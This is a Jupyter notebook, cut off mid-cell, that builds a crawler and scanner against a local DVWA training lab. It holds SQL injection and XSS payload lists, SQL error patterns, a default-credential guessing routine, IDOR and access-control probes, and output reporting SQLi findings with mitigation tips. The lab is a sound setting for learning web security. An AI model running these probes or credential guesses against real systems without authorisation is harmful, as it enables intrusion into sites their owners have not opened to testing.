{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "c46ad7c7-5e99-49a3-b304-33d99115a64f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting tqdm\n",
      "  Downloading tqdm-4.67.1-py3-none-any.whl.metadata (57 kB)\n",
      "Requirement already satisfied: colorama in c:\\users\\cibis\\appdata\\local\\programs\\python\\python311\\lib\\site-packages (from tqdm) (0.4.6)\n",
      "Downloading tqdm-4.67.1-py3-none-any.whl (78 kB)\n",
      "Installing collected packages: tqdm\n",
      "Successfully installed tqdm-4.67.1\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install tqdm\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "cfcc27db-2b41-4128-96e0-d4dbac4159d7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Login successful\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:   0%|                                                                                 | 0/10 [00:00<?, ?it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  20%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Œ                                                          | 2/10 [00:02<00:08,  1.04s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/instructions.php\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  30%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‰                                                   | 3/10 [00:04<00:10,  1.45s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/setup.php\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  40%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–                                           | 4/10 [00:06<00:10,  1.67s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/vulnerabilities/brute\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  50%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Œ                                    | 5/10 [00:08<00:09,  1.82s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/vulnerabilities/exec\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  60%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Š                             | 6/10 [00:10<00:07,  1.90s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/vulnerabilities/csrf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  70%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                      | 7/10 [00:12<00:05,  1.96s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/vulnerabilities/fi/?page=include.php\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  80%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–              | 8/10 [00:14<00:03,  1.98s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/vulnerabilities/upload\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling:  90%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‹       | 9/10 [00:16<00:02,  2.01s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/vulnerabilities/captcha\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 10/10 [00:18<00:00,  2.04s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Crawled: http://localhost:8080/vulnerabilities/sqli\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Crawling: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 10/10 [00:20<00:00,  2.06s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ðŸ”¥ SQLi detected in form http://localhost:8080/vulnerabilities/brute field=username payload=1'--\n",
      "ðŸ”¥ SQLi detected in form http://localhost:8080/vulnerabilities/brute field=username payload=' UNION SELECT NULL--\n",
      "ðŸ”¥ SQLi detected in form http://localhost:8080/vulnerabilities/sqli field=id payload=1'--\n",
      "ðŸ”¥ SQLi detected in form http://localhost:8080/vulnerabilities/sqli field=id payload=' UNION SELECT NULL--\n",
      "\n",
      "=== Vulnerability Findings ==\n",
      "[SQLi-FORM]\n",
      "   URL: http://localhost:8080/vulnerabilities/brute\n",
      "   Field: username\n",
      "   Payload: 1'--\n",
      "   Error: you have an error in your sql syntax;\n",
      "--------------------------------------------------\n",
      "[SQLi-FORM]\n",
      "   URL: http://localhost:8080/vulnerabilities/brute\n",
      "   Field: username\n",
      "   Payload: ' UNION SELECT NULL--\n",
      "   Error: you have an error in your sql syntax;\n",
      "--------------------------------------------------\n",
      "[SQLi-FORM]\n",
      "   URL: http://localhost:8080/vulnerabilities/sqli\n",
      "   Field: id\n",
      "   Payload: 1'--\n",
      "   Error: you have an error in your sql syntax;\n",
      "--------------------------------------------------\n",
      "[SQLi-FORM]\n",
      "   URL: http://localhost:8080/vulnerabilities/sqli\n",
      "   Field: id\n",
      "   Payload: ' UNION SELECT NULL--\n",
      "   Error: you have an error in your sql syntax;\n",
      "--------------------------------------------------\n",
      "\n",
      "ðŸ“‚ Results saved to scan_results.csv\n",
      "\n",
      "=== Mitigation Tips ==\n",
      "SQLi Fixes: Use parameterized queries (PreparedStatements), ORM, input validation.\n",
      "XSS Fixes: Validate input, encode output, apply Content Security Policy (CSP).\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "import re\n",
    "import csv\n",
    "from urllib.parse import urljoin, urldefrag, urlparse, parse_qs, urlencode, urlunparse\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "from collections import deque\n",
    "from tqdm import tqdm\n",
    "\n",
    "# ==============================\n",
    "# SQL Injection Payloads & Errors (Safe List)\n",
    "# ==============================\n",
    "SQL_PAYLOADS = [\n",
    "    \"' OR '1'='1\",\n",
    "    \"\\\" OR \\\"1\\\"=\\\"1\",\n",
    "    \"1'--\",\n",
    "    \"1 OR 1=1\",\n",
    "    \"' UNION SELECT NULL--\"\n",
    "    # âŒ Removed dangerous payloads like DROP TABLE\n",
    "]\n",
    "\n",
    "SQL_ERROR_PATTERNS = [\n",
    "    \"you have an error in your sql syntax;\",\n",
    "    \"warning: mysql\",\n",
    "    \"unclosed quotation mark after the character string\",\n",
    "    \"quoted string not properly terminated\",\n",
    "    \"pg_query\",\n",
    "    \"mysql_fetch\",\n",
    "    \"sql error\"\n",
    "]\n",
    "\n",
    "def find_sql_errors(html):\n",
    "    \"\"\"Scan response HTML for common SQL error messages.\"\"\"\n",
    "    for pattern in SQL_ERROR_PATTERNS:\n",
    "        if pattern.lower() in html.lower():\n",
    "            return True, pattern\n",
    "    return False, None\n",
    "\n",
    "\n",
    "# ==============================\n",
    "# XSS Payloads & Reflection Patterns\n",
    "# ==============================\n",
    "XSS_PAYLOADS = [\n",
    "    \"<script>alert(1)</script>\",\n",
    "    \"<img src=x onerror=alert(1)>\",\n",
    "    \"<svg onload=alert(1)>\"\n",
    "]\n",
    "\n",
    "REFLECT_PATTERNS = [re.compile(re.escape(p), re.IGNORECASE) for p in XSS_PAYLOADS]\n",
    "\n",
    "\n",
    "# ==============================\n",
    "# DVWA Web Crawler\n",
    "# ==============================\n",
    "class DVWACrawler:\n",
    "    def __init__(self, base_url, username=\"admin\", password=\"password\",\n",
    "                 max_pages=20, delay=2):  # â¬… Delay increased to 2s\n",
    "        self.base_url = base_url.rstrip(\"/\")\n",
    "        self.max_pages = max_pages\n",
    "        self.delay = delay\n",
    "        self.session = requests.Session()\n",
    "        self.visited = set()\n",
    "        self.queue = deque([self.base_url])\n",
    "        self.pages = {}\n",
    "        self.forms = {}\n",
    "\n",
    "        # login first\n",
    "        self.login(username, password)\n",
    "\n",
    "    def normalize_url(self, url):\n",
    "        \"\"\"Normalize URL by stripping fragments/trailing slash.\"\"\"\n",
    "        clean_url = urldefrag(url)[0].rstrip(\"/\")\n",
    "        return clean_url\n",
    "\n",
    "    def login(self, username, password):\n",
    "        \"\"\"Logs into DVWA using session-based authentication.\"\"\"\n",
    "        login_url = f\"{self.base_url}/login.php\"\n",
    "        resp = self.session.get(login_url)\n",
    "        soup = BeautifulSoup(resp.text, \"html.parser\")\n",
    "\n",
    "        token = soup.find(\"input\", {\"name\": \"user_token\"})\n",
    "        token_val = token[\"value\"] if token else \"\"\n",
    "\n",
    "        payload = {\n",
    "            \"username\": username,\n",
    "            \"password\": password,\n",
    "            \"Login\": \"Login\",\n",
    "            \"user_token\": token_val\n",
    "        }\n",
    "\n",
    "        login_resp = self.session.post(login_url, data=payload)\n",
    "        if \"Login failed\" in login_resp.text:\n",
    "            raise Exception(\"Login failed: check credentials or CSRF token.\")\n",
    "        print(\"âœ… Login successful\")\n",
    "\n",
    "    def extract_links(self, html, page_url):\n",
    "        \"\"\"Extract all same-domain links from a page.\"\"\"\n",
    "        soup = BeautifulSoup(html, \"html.parser\")\n",
    "        links = []\n",
    "        for a in soup.find_all(\"a\", href=True):\n",
    "            abs_url = urljoin(page_url, a[\"href\"])\n",
    "            clean_url = self.normalize_url(abs_url)\n",
    "            if clean_url.startswith(self.base_url):\n",
    "                links.append(clean_url)\n",
    "        return links\n",
    "\n",
    "    def extract_forms(self, html, page_url):\n",
    "        \"\"\"Extract form details (method, action, inputs).\"\"\"\n",
    "        soup = BeautifulSoup(html, \"html.parser\")\n",
    "        forms = []\n",
    "        for form in soup.find_all(\"form\"):\n",
    "            details = {\n",
    "                \"method\": form.get(\"method\", \"get\").lower(),\n",
    "                \"action\": urljoin(page_url, form.get(\"action\", \"\")),\n",
    "                \"inputs\": []\n",
    "            }\n",
    "            for inp in form.find_all([\"input\", \"textarea\", \"select\"]):\n",
    "                details[\"inputs\"].append({\n",
    "                    \"name\": inp.get(\"name\"),\n",
    "                    \"type\": inp.get(\"type\", inp.name),\n",
    "                    \"value\": inp.get(\"value\", \"\")\n",
    "                })\n",
    "            forms.append(details)\n",
    "        return forms\n",
    "\n",
    "    def crawl(self):\n",
    "        \"\"\"Main crawl loop.\"\"\"\n",
    "        with tqdm(total=self.max_pages, desc=\"Crawling\") as pbar:\n",
    "            while self.queue and len(self.visited) < self.max_pages:\n",
    "                url = self.normalize_url(self.queue.popleft())\n",
    "\n",
    "                if url in self.visited:\n",
    "                    continue\n",
    "\n",
    "                try:\n",
    "                    resp = self.session.get(url, timeout=10)\n",
    "                    resp.raise_for_status()\n",
    "                    html = resp.text\n",
    "                except Exception as e:\n",
    "                    print(f\" Error fetching {url}: {e}\")\n",
    "                    self.visited.add(url)\n",
    "                    continue\n",
    "\n",
    "                # store page\n",
    "                self.pages[url] = html\n",
    "\n",
    "                # extract & store forms\n",
    "                page_forms = self.extract_forms(html, url)\n",
    "                if page_forms:\n",
    "                    self.forms[url] = page_forms\n",
    "\n",
    "                # extract & enqueue links\n",
    "                for link in self.extract_links(html, url):\n",
    "                    if link not in self.visited and link not in self.queue:\n",
    "                        self.queue.append(link)\n",
    "\n",
    "                self.visited.add(url)\n",
    "                print(f\"âœ… Crawled: {url}\")\n",
    "                pbar.update(1)\n",
    "\n",
    "                time.sleep(self.delay)\n",
    "\n",
    "        return {\"pages\": self.pages, \"forms\": self.forms, \"session\": self.session}\n",
    "\n",
    "\n",
    "# ==============================\n",
    "# SQL Injection Scanner\n",
    "# ==============================\n",
    "class SQLiScanner:\n",
    "    def __init__(self, session, timeout=10):\n",
    "        self.session = session\n",
    "        self.timeout = timeout\n",
    "        self.findings = []\n",
    "\n",
    "    def test_url_params(self, url):\n",
    "        \"\"\"Inject SQL payloads into URL query parameters.\"\"\"\n",
    "        parsed = urlparse(url)\n",
    "        params = parse_qs(parsed.query)\n",
    "\n",
    "        if not params:\n",
    "            return\n",
    "\n",
    "        for param in params:\n",
    "            for payload in SQL_PAYLOADS:\n",
    "                test_params = params.copy()\n",
    "                test_params[param] = payload\n",
    "                new_query = urlencode(test_params, doseq=True)\n",
    "                new_url = urlunparse(parsed._replace(query=new_query))\n",
    "\n",
    "                try:\n",
    "                    resp = self.session.get(new_url, timeout=self.timeout)\n",
    "                    found, pattern = find_sql_errors(resp.text)\n",
    "                    if found:\n",
    "                        self.findings.append({\n",
    "                            \"type\": \"SQLi-URL\",\n",
    "                            \"url\": new_url,\n",
    "                            \"parameter\": param,\n",
    "                            \"payload\": payload,\n",
    "                            \"error\": pattern\n",
    "                        })\n",
    "                        print(f\"ðŸ”¥ SQLi detected in {new_url} param={param} payload={payload}\")\n",
    "                except Exception:\n",
    "                    pass\n",
    "                time.sleep(0.2)  # â¬… slow down\n",
    "\n",
    "    def test_forms(self, forms_by_url):\n",
    "        \"\"\"Inject SQL payloads into HTML forms.\"\"\"\n",
    "        for page_url, forms in forms_by_url.items():\n",
    "            for form in forms:\n",
    "                action = form.get(\"action\") or page_url\n",
    "                method = form.get(\"method\", \"get\").lower()\n",
    "\n",
    "                base_data = {inp[\"name\"]: (inp.get(\"value\") or \"test\")\n",
    "                             for inp in form[\"inputs\"] if inp.get(\"name\")}\n",
    "\n",
    "                for field in base_data:\n",
    "                    for payload in SQL_PAYLOADS:\n",
    "                        test_data = base_data.copy()\n",
    "                        test_data[field] = payload\n",
    "\n",
    "                        try:\n",
    "                            if method == \"post\":\n",
    "                                resp = self.session.post(action, data=test_data,\n",
    "                                                         timeout=self.timeout)\n",
    "                            else:\n",
    "                                resp = self.session.get(action, params=test_data,\n",
    "                                                        timeout=self.timeout)\n",
    "\n",
    "                            found, pattern = find_sql_errors(resp.text)\n",
    "                            if found:\n",
    "                                self.findings.append({\n",
    "                                    \"type\": \"SQLi-FORM\",\n",
    "                                    \"url\": action,\n",
    "                                    \"field\": field,\n",
    "                                    \"payload\": payload,\n",
    "                                    \"error\": pattern\n",
    "                                })\n",
    "                                print(f\"ðŸ”¥ SQLi detected in form {action} field={field} payload={payload}\")\n",
    "                        except Exception:\n",
    "                            pass\n",
    "                        time.sleep(0.2)  # â¬… slow down\n",
    "\n",
    "    def run(self, pages, forms):\n",
    "        \"\"\"Run scanner against crawler results.\"\"\"\n",
    "        for url in pages.keys():\n",
    "            self.test_url_params(url)\n",
    "        self.test_forms(forms)\n",
    "        return self.findings\n",
    "\n",
    "\n",
    "# ==============================\n",
    "# XSS Scanner\n",
    "# ==============================\n",
    "class XSSScanner:\n",
    "    def __init__(self, session, timeout=10):\n",
    "        self.session = session\n",
    "        self.timeout = timeout\n",
    "        self.findings = []\n",
    "\n",
    "    def test_url_params(self, url):\n",
    "        \"\"\"Inject XSS payloads into URL query parameters.\"\"\"\n",
    "        parsed = urlparse(url)\n",
    "        params = parse_qs(parsed.query)\n",
    "\n",
    "        if not params:\n",
    "            return\n",
    "\n",
    "        for param in params:\n",
    "            for payload in XSS_PAYLOADS:\n",
    "                test_params = params.copy()\n",
    "                test_params[param] = payload\n",
    "                new_query = urlencode(test_params, doseq=True)\n",
    "                new_url = urlunparse(parsed._replace(query=new_query))\n",
    "\n",
    "                try:\n",
    "                    resp = self.session.get(new_url, timeout=self.timeout)\n",
    "                    for pattern in REFLECT_PATTERNS:\n",
    "                        if pattern.search(resp.text):\n",
    "                            self.findings.append({\n",
    "                                \"type\": \"XSS-URL\",\n",
    "                                \"url\": new_url,\n",
    "                                \"parameter\": param,\n",
    "                                \"payload\": payload\n",
    "                            })\n",
    "                            print(f\"âš¡ XSS detected in {new_url} param={param} payload={payload}\")\n",
    "                            break\n",
    "                except Exception:\n",
    "                    pass\n",
    "                time.sleep(0.2)\n",
    "\n",
    "    def test_forms(self, forms_by_url):\n",
    "        \"\"\"Inject XSS payloads into HTML forms.\"\"\"\n",
    "        for page_url, forms in forms_by_url.items():\n",
    "            for form in forms:\n",
    "                action = form.get(\"action\") or page_url\n",
    "                method = form.get(\"method\", \"get\").lower()\n",
    "\n",
    "                base_data = {inp[\"name\"]: (inp.get(\"value\") or \"test\")\n",
    "                             for inp in form[\"inputs\"] if inp.get(\"name\")}\n",
    "\n",
    "                for field in base_data:\n",
    "                    for payload in XSS_PAYLOADS:\n",
    "                        test_data = base_data.copy()\n",
    "                        test_data[field] = payload\n",
    "\n",
    "                        try:\n",
    "                            if method == \"post\":\n",
    "                                resp = self.session.post(action, data=test_data,\n",
    "                                                         timeout=self.timeout)\n",
    "                            else:\n",
    "                                resp = self.session.get(action, params=test_data,\n",
    "                                                        timeout=self.timeout)\n",
    "\n",
    "                            for pattern in REFLECT_PATTERNS:\n",
    "                                if pattern.search(resp.text):\n",
    "                                    self.findings.append({\n",
    "                                        \"type\": \"XSS-FORM\",\n",
    "                                        \"url\": action,\n",
    "                                        \"field\": field,\n",
    "                                        \"payload\": payload\n",
    "                                    })\n",
    "                                    print(f\"âš¡ XSS detected in form {action} field={field} payload={payload}\")\n",
    "                                    break\n",
    "                        except Exception:\n",
    "                            pass\n",
    "                        time.sleep(0.2)\n",
    "\n",
    "    def run(self, pages, forms):\n",
    "        \"\"\"Run scanner against crawler results.\"\"\"\n",
    "        for url in pages.keys():\n",
    "            self.test_url_params(url)\n",
    "        self.test_forms(forms)\n",
    "        return self.findings\n",
    "\n",
    "\n",
    "# ==============================\n",
    "# Main\n",
    "# ==============================\n",
    "if __name__ == \"__main__\":\n",
    "    base_url = \"http://localhost:8080\"  # Change to your DVWA URL\n",
    "\n",
    "    # Step 1: Crawl\n",
    "    crawler = DVWACrawler(base_url, username=\"admin\", password=\"password\",\n",
    "                          max_pages=10, delay=2)  # â¬… safer delay\n",
    "    crawl_results = crawler.crawl()\n",
    "\n",
    "    # Step 2: SQL Injection Scan\n",
    "    sqli_scanner = SQLiScanner(crawl_results[\"session\"])\n",
    "    sqli_findings = sqli_scanner.run(crawl_results[\"pages\"], crawl_results[\"forms\"])\n",
    "\n",
    "    # Step 3: XSS Scan\n",
    "    xss_scanner = XSSScanner(crawl_results[\"session\"])\n",
    "    xss_findings = xss_scanner.run(crawl_results[\"pages\"], crawl_results[\"forms\"])\n",
    "\n",
    "    # Step 4: Pretty Report\n",
    "    print(\"\\n=== Vulnerability Findings ===\")\n",
    "    all_findings = sqli_findings + xss_findings\n",
    "    if all_findings:\n",
    "        for f in all_findings:\n",
    "            print(f\"[{f['type']}]\")\n",
    "            print(f\"   URL: {f['url']}\")\n",
    "            if 'parameter' in f:\n",
    "                print(f\"   Parameter: {f['parameter']}\")\n",
    "            if 'field' in f:\n",
    "                print(f\"   Field: {f['field']}\")\n",
    "            print(f\"   Payload: {f['payload']}\")\n",
    "            if 'error' in f:\n",
    "                print(f\"   Error: {f['error']}\")\n",
    "            print(\"-\" * 50)\n",
    "    else:\n",
    "        print(\"No SQLi or XSS vulnerabilities detected.\")\n",
    "\n",
    "    # Step 5: Export to CSV\n",
    "    with open(\"scan_results.csv\", \"w\", newline=\"\", encoding=\"utf-8\") as f:\n",
    "        writer = csv.DictWriter(f, fieldnames=[\"type\", \"url\", \"parameter\", \"field\", \"payload\", \"error\"])\n",
    "        writer.writeheader()\n",
    "        for finding in all_findings:\n",
    "            writer.writerow(finding)\n",
    "    print(\"\\nðŸ“‚ Results saved to scan_results.csv\")\n",
    "\n",
    "    print(\"\\n=== Mitigation Tips ===\")\n",
    "    print(\"SQLi Fixes: Use parameterized queries (PreparedStatements), ORM, input validation.\")\n",
    "    print(\"XSS Fixes: Validate input, encode output, apply Content Security Policy (CSP).\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "5438ce74-f75b-4312-b9fc-2564f2739a27",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "ðŸ”Ž Testing Weak Credentials at http://localhost:8080/login.php\n",
      "[-] admin:admin rejected\n",
      "[-] admin:password rejected\n",
      "[-] root:root rejected\n",
      "[-] test:test rejected\n",
      "\n",
      "ðŸ”Ž Checking Cookie Flags\n",
      "âš ï¸ Cookie flag issues: Missing HttpOnly, Missing Secure, Missing SameSite\n",
      "\n",
      "ðŸ”Ž Testing IDOR at http://localhost:8080/vulnerabilities/idor/ (param=id)\n",
      "[?] id=1 returned content (needs review)\n",
      "[?] id=2 returned content (needs review)\n",
      "[?] id=3 returned content (needs review)\n",
      "[?] id=4 returned content (needs review)\n",
      "[?] id=5 returned content (needs review)\n",
      "\n",
      "ðŸ”Ž Testing Access Control (Role Bypass)\n",
      "[-] http://localhost:8080/admin/ seems protected\n",
      "[-] http://localhost:8080/config.php seems protected\n",
      "ðŸ”¥ Access Control issue â†’ http://localhost:8080/vulnerabilities/ accessible without login\n",
      "\n",
      "=== Findings \n",
      "{'type': 'Cookie-Issues', 'issues': ['Missing HttpOnly', 'Missing Secure', 'Missing SameSite']}\n",
      "{'type': 'Access-Control', 'url': 'http://localhost:8080/vulnerabilities/', 'status': 200}\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "from urllib.parse import urljoin, urlparse\n",
    "import time\n",
    "\n",
    "\n",
    "class AuthSessionTester:\n",
    "    DEFAULT_CREDENTIALS = [\n",
    "        (\"admin\", \"admin\"),\n",
    "        (\"admin\", \"password\"),\n",
    "        (\"root\", \"root\"),\n",
    "        (\"test\", \"test\")\n",
    "    ]\n",
    "\n",
    "    def __init__(self, base_url, session=None, timeout=10):\n",
    "        self.base_url = base_url.rstrip(\"/\")\n",
    "        self.session = session or requests.Session()\n",
    "        self.timeout = timeout\n",
    "        self.findings = []\n",
    "\n",
    "    def test_weak_credentials(self, login_path=\"/login.php\"):\n",
    "        \"\"\"Try common weak/default credentials.\"\"\"\n",
    "        login_url = urljoin(self.base_url, login_path.lstrip(\"/\"))\n",
    "        print(f\"\\nðŸ”Ž Testing Weak Credentials at {login_url}\")\n",
    "\n",
    "        for user, pwd in self.DEFAULT_CREDENTIALS:\n",
    "            try:\n",
    "                # Grab CSRF token if present\n",
    "                r = self.session.get(login_url, timeout=self.timeout)\n",
    "                soup = BeautifulSoup(r.text, \"html.parser\")\n",
    "                token = soup.find(\"input\", {\"name\": \"user_token\"})\n",
    "                token_val = token[\"value\"] if token else \"\"\n",
    "\n",
    "                data = {\n",
    "                    \"username\": user,\n",
    "                    \"password\": pwd,\n",
    "                    \"Login\": \"Login\",\n",
    "                    \"user_token\": token_val\n",
    "                }\n",
    "                resp = self.session.post(login_url, data=data, timeout=self.timeout)\n",
    "\n",
    "                if \"Logout\" in resp.text or \"Welcome\" in resp.text:\n",
    "                    print(f\"ðŸ”¥ Weak credentials found â†’ {user}:{pwd}\")\n",
    "                    self.findings.append({\n",
    "                        \"type\": \"Weak-Credentials\",\n",
    "                        \"username\": user,\n",
    "                        \"password\": pwd\n",
    "                    })\n",
    "                else:\n",
    "                    print(f\"[-] {user}:{pwd} rejected\")\n",
    "            except Exception as e:\n",
    "                print(f\"[Error] {e}\")\n",
    "            time.sleep(0.5)\n",
    "\n",
    "        return self.findings\n",
    "\n",
    "    def check_cookie_flags(self, login_path=\"/login.php\"):\n",
    "        \"\"\"Check for Secure, HttpOnly, SameSite flags in cookies.\"\"\"\n",
    "        login_url = urljoin(self.base_url, login_path.lstrip(\"/\"))\n",
    "        print(\"\\nðŸ”Ž Checking Cookie Flags\")\n",
    "\n",
    "        try:\n",
    "            resp = self.session.get(login_url, timeout=self.timeout)\n",
    "            set_cookie = resp.headers.get(\"set-cookie\", \"\")\n",
    "            issues = []\n",
    "            if \"httponly\" not in set_cookie.lower():\n",
    "                issues.append(\"Missing HttpOnly\")\n",
    "            if \"secure\" not in set_cookie.lower():\n",
    "                issues.append(\"Missing Secure\")\n",
    "            if \"samesite\" not in set_cookie.lower():\n",
    "                issues.append(\"Missing SameSite\")\n",
    "\n",
    "            if issues:\n",
    "                print(\"âš ï¸ Cookie flag issues:\", \", \".join(issues))\n",
    "                self.findings.append({\n",
    "                    \"type\": \"Cookie-Issues\",\n",
    "                    \"issues\": issues\n",
    "                })\n",
    "            else:\n",
